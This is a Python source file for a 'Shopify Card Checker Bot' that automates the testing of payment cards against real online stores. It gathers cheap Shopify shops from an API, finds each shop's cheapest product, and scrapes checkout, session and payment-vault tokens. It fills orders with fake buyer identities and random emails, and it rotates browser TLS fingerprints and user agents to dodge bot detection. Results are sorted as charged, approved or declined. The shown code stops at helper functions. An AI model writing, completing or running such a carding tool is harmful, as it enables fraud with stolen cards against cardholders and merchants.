#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  Speedy Hitter — Shopify Card Checker Bot  (single-file edition)
# =============================================================================
#
#  SETUP
#  -----
#  1. Install dependencies:
#       pip install telethon curl_cffi aiohttp aiofiles requests urllib3 python-dotenv
#
#  2. Configure via .env in the same folder:
#       API_ID=1234567
#       API_HASH=abcdef...
#       BOT_TOKEN=123456:ABC...
#       ADMIN_ID=your_telegram_id
#       OWNER_NAME=Your Name
#       OWNER_USERNAME=your_handle
#       BOT_BRAND=Speedy Hitter
#       KEY_PREFIX=SPEEDY
#       SESSION_NAME=speedy_hitter
#
#  3. Run:
#       python3 bot.py
#
# =============================================================================

import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime

import asyncio
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── env bootstrap ──────────────────────────────
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

def _env(key, default=""):
    return os.environ.get(key, default)

# ──────────────────────── config ─────────────────────────────────────

SITE_TXT = Path(__file__).parent / "site.txt"
MAX_SITE_AMOUNT = 20.0
SITE_ERROR_THRESHOLD = 8
SITE_META_FILE = "sites_meta.json"

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class WorkingSite:
    url: str
    amount: float

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael","johnson", "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert","williams", "456 Main St",            "",          "Houston",       "US", "TX",  "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown",    "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139", "+13055550100", "hotmail.com"),
    "CA":    Address("john",  "smith",    "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william","davis",   "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":    Address("james", "wilson",   "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "GB-MAN":Address("oliver","martinez","123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":    Address("thomas","taylor",   "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",    "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel","anderson", "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",    "+61398765432",  "yahoo.com"),
    "DE":    Address("lucas", "thomas",   "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",   "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix", "schmidt",  "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",   "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",  "bernard",  "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",   "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis", "petit",    "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",   "+33487654321",  "outlook.com"),
    "NZ":    Address("jack",  "wilson",   "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",    "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",  "brown",    "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",    "+6449876543",   "gmail.com"),
    "IE":    Address("sean",  "murphy",   "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006","+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",  "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88","+35321456789",  "gmail.com"),
    "NL":    Address("bas",   "jansen",   "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS", "+31201234567",  "gmail.com"),
    "ES":    Address("carlos","garcia",   "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",   "+34912345678",  "gmail.com"),
    "IT":    Address("marco", "rossi",    "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",   "+39061234567",  "gmail.com"),
    "SE":    Address("erik",  "andersson","Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",  "+468123456",    "gmail.com"),
    "NO":    Address("olav",  "hansen",   "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",    "+4721234567",   "gmail.com"),
    "DK":    Address("lars",  "nielsen",  "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",    "+4531234567",   "gmail.com"),
    "FI":    Address("jussi", "korhonen", "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",   "+35891234567",  "gmail.com"),
    "BE":    Address("jan",   "peeters",  "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",    "+3221234567",   "gmail.com"),
    "CH":    Address("hans",  "weber",    "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",    "+41441234567",  "gmail.com"),
    "AT":    Address("markus","gruber",   "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",    "+4312345678",   "gmail.com"),
    "JP":    Address("takashi","yamamoto","1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005","+81312345678",  "gmail.com"),
    "SG":    Address("wei",   "tan",      "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",  "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout   = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self.proxy_url:
            kwargs.setdefault('proxy', self.proxy_url)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self.proxy_url:
            kwargs.setdefault('proxy', self.proxy_url)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ──────────────────────── Site fetching ──────────────────────────────

def choose_affordable_site(api_url: str, max_amount: float) -> "WorkingSite":
    sites = fetch_affordable_sites(api_url, max_amount)
    if not sites:
        raise Exception(f"no sites <= {max_amount} from {api_url}")
    return random.choice(sites)

def fetch_affordable_sites(api_url: str, max_amount: float) -> List["WorkingSite"]:
    page_size = 100
    out: List[WorkingSite] = []
    seen: set = set()
    offset = 0
    MAX_PAGES = 20

    for _ in range(MAX_PAGES):
        page_url = f"{api_url}?limit={page_size}&offset={offset}"
        try:
            resp = requests.get(page_url, timeout=12)
            if resp.status_code != 200:
                if out:
                    break
                raise Exception(f"GET {page_url} returned {resp.status_code}")

            body = resp.text.strip()
            if body.startswith("<!DOCTYPE html") or "<tbody>" in body:
                return parse_dashboard_html_sites(body, max_amount)

            payload   = resp.json()
            page_sites = collect_objects(payload)
            if not page_sites:
                break

            for obj in page_sites:
                site_url = extract_site_url(obj)
                if not site_url:
                    continue
                amount, ok = extract_amount(obj)
                if not ok or amount > max_amount:
                    continue
                if site_url in seen:
                    continue
                seen.add(site_url)
                out.append(WorkingSite(url=site_url, amount=amount))

            if len(page_sites) < page_size:
                break
            offset += page_size

        except Exception:
            if out:
                break
            raise

    if not out:
        raise Exception("no affordable sites found in API payload")

    print(f"[SITES] fetched {len(out)} affordable sites (under ${max_amount:.0f})")
    return out

def parse_dashboard_html_sites(html_body: str, max_amount: float) -> List["WorkingSite"]:
    row_re = re.compile(r'<a href="(https?://[^"]+)"[^>]*>[^<]*</a>\s*<td class="price">\$?([^<]+)\s*</td>')
    out, seen = [], set()
    for match in row_re.findall(html_body):
        site_url = match[0].strip().rstrip('/')
        amount, ok = to_float(match[1].strip())
        if not ok or amount > max_amount or site_url in seen:
            continue
        seen.add(site_url)
        out.append(WorkingSite(url=site_url, amount=amount))
    return out

def collect_objects(v: Any) -> List[Dict]:
    out = []
    if isinstance(v, dict):
        out.append(v)
        for child in v.values():
            out.extend(collect_objects(child))
    elif isinstance(v, list):
        for child in v:
            out.extend(collect_objects(child))
    return out

def extract_site_url(obj: Dict) -> str:
    for k in ["site","url","shop_url","shopUrl","shop","domain","website"]:
        raw = obj.get(k)
        if not raw:
            continue
        s = str(raw).strip()
        if not s.startswith(("http://","https://")):
            s = "https://" + s
        try:
            parsed = urllib.parse.urlparse(s)
            if parsed.netloc:
                return f"{parsed.scheme}://{parsed.netloc}".rstrip('/')
        except Exception:
            continue
    return ""

def extract_amount(obj: Dict) -> Tuple[float, bool]:
    for k in ["amount","price","checkout_price","value","min_amount","minAmount"]:
        raw = obj.get(k)
        if raw is not None:
            n, ok = to_float(raw)
            if ok:
                return n, True
    return 0, False

def to_float(v: Any) -> Tuple[float, bool]:
    if isinstance(v, (int, float)):
        return float(v), True
    if isinstance(v, str):
        match = re.search(r'[-+]?\d*\.?\d+', v)
        if match:
            try:
                return float(match.group()), True
            except ValueError:
                pass
    return 0, False

# ──────────────────────── Step 0: cheapest product ───────────────────

def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.01) -> Tuple[str, str, str, str]:
    best_price = float('inf')
    product_title = product_id = variant_id = price_str = ""

    page = 1
    while page <= 20:
        for attempt in range(3):
            resp = client.get(f"{shop_url}/products.json?limit=250&page={page}")
            if resp.status_code == 200:
                break
            if resp.status_code in (503, 502, 429, 500) and attempt < 2:
                import time as _t; _t.sleep(2 + attempt * 2)
                continue
            raise Exception(f"GET products.json page {page} returned {resp.status_code}")

        products = resp.json().get("products", [])
        if not products:
            break

        for p in products:
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price:
                    continue
                if price < best_price:
                    best_price    = price
                    product_title = p.get("title", "")
                    product_id    = str(p.get("id", ""))
                    variant_id    = str(v.get("id", ""))
                    price_str     = v.get("price", "")
        page += 1

    if not product_title:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

    return product_title, product_id, variant_id, price_str

# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers={
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-ch-ua":                 '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    if match:
        return match.group(1)
    match = re.search(r'&quot;checkoutSessionIdentifier&quot;:&quot;([a-f0-9]+)&quot;', checkout_html)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""

def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

# ──────────────────────── Extraction helpers ─────────────────────────

def capture(data: str, first: str, last: str):
    try:
        start = data.index(first) + len(first)
        end   = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text: str, start: str, end: str):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
        return None
    except Exception:
        return None

def extract_queue_token(proposal_json: str) -> str:
    unescaped = html.unescape(proposal_json)
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', unescaped)
    if m:
        return m.group(1)
    m = re.search(r'&quot;queueToken&quot;:&quot;([^&]+)&quot;', proposal_json)
    return m.group(1) if m else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    if m:
        return m.group(1)
    m = re.search(r'&quot;stableId&quot;:&quot;([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})&quot;', checkout_html)
    if m:
        return m.group(1)
    m = re.search(r'stableId[^a-z0-9]{1,10}([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', unescaped)
    return m.group(1) if m else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    if m:
        return m.group(1)
    m = re.search(r'&quot;commitSha&quot;:&quot;([a-f0-9]{40})&quot;', checkout_html)
    if m:
        return m.group(1)
    m = re.search(r'commitSha[^a-z0-9]{1,10}([a-f0-9]{40})', unescaped)
    return m.group(1) if m else ""

def extract_source_token(checkout_html: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    if m:
        v = html.unescape(m.group(1)).strip('"')
        if v:
            return v
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="&quot;([^&]+)&quot;"', checkout_html)
    if m:
        return m.group(1)
    m = re.search(r'serialized-sourceToken[^>]+content="([^"]+)"', checkout_html)
    if m:
        return html.unescape(m.group(1)).strip('"').replace("&quot;", "")
    return ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = checkout_html.replace('&quot;', '"')
    for pattern in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pattern, unescaped)
        if m:
            return m.group(1)
    return ""

def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""

def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    return m.group(1) if m else ""

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_delivery_handle(proposal_body: str) -> str:
    try:
        data   = json.loads(proposal_body)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        sds = seller.get("selectedDeliveryStrategy", {})
        if isinstance(sds, dict) and sds.get("handle"):
            return sds["handle"]
        de = seller.get("deliveryExpectations", {})
        if isinstance(de, dict):
            for exp in de.get("deliveryExpectations", []):
                if isinstance(exp, dict) and exp.get("handle"):
                    return exp["handle"]
        for dg in seller.get("deliveryGroups", []):
            if isinstance(dg, dict):
                for opt in dg.get("deliveryOptions", []):
                    if isinstance(opt, dict) and opt.get("handle"):
                        return opt["handle"]
    except Exception:
        pass

    m = re.search(r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"', proposal_body)
    if m:
        return m.group(1)
    m = re.search(
        r'"handle"\s*:\s*"([^"]+)"[^}]{0,120}"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        proposal_body)
    if m:
        return m.group(1)
    m = re.search(
        r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^}]{0,120}"handle"\s*:\s*"([^"]+)"',
        proposal_body)
    if m:
        return m.group(1)
    m = re.search(
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        proposal_body)
    if m:
        return m.group(1)
    m = re.search(r'"handle"\s*:\s*"([A-Za-z0-9+/=_\-]{20,})"', proposal_body)
    if m:
        return m.group(1)
    return ""

def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""

def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_payment_method_id(proposal_body: str) -> str:
    match = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return match.group(1) if match else ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)

